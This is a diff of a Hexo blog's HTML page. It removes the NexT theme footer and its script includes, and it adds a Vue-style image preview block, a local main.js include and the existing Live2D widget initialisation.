-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
         
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2023</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">CloudFlowing</span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  
-  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/blog/lib/canvas-nest/canvas-nest.min.js"></script>
-  <script src="/blog/lib/anime.min.js"></script>
-  <script src="/blog/lib/velocity/velocity.min.js"></script>
-  <script src="/blog/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/blog/js/utils.js"></script>
-
-<script src="/blog/js/motion.js"></script>
-
-
-<script src="/blog/js/schemes/pisces.js"></script>
-
-
-<script src="/blog/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-
-<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
